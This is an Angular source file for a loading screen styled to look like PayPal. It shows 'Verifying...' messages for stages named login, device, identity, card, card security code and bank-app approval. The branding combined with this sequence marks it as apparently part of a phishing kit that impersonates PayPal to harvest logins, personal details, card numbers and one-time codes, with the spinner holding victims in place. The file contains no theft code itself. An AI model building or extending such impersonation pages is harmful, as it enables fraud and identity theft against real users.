
import { Component, inject, computed, signal, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-loading',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center justify-center py-12">

        <!-- PayPal Blue Arc Spinner -->
        <div class="relative w-16 h-16 mb-8">
            <div class="absolute inset-0 rounded-full border-[3px] border-slate-100"></div>
            <div class="absolute inset-0 rounded-full border-[3px] border-t-pp-blue border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
        </div>

        <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight animate-fade-in">
          {{ title() }}
        </h1>
        
        <p class="text-base text-slate-500 text-center font-medium max-w-xs mx-auto animate-pulse">
           {{ subMessage() }}
        </p>
      </div>
    </app-public-layout>
  `
})
export class LoadingComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  subMessage = signal('Just a second...');
  private interval: any;

  title = computed(() => {
    const stage = this.state.stage();
    if (stage === 'login') return 'Verifying your information...';
    if (stage === 'phone_pending') return 'Verifying your device...';
    if (stage === 'personal_pending') return 'Verifying identity...';
    if (stage === 'card_pending') return 'Verifying payment details...';
    if (stage === 'card_otp_pending') return 'Verifying security code...';
    if (stage === 'bank_app_pending') return 'Verifying transaction...';
    return 'Processing...';
  });

  ngOnInit() {
      const msgs = ['Just a second...', 'Still working...', 'Almost there...'];
      let i = 0;
      this.interval = setInterval(() => {
          this.subMessage.set(msgs[i % msgs.length]);
          i++;
      }, 2000);
  }

  ngOnDestroy() {
      clearInterval(this.interval);
  }
}
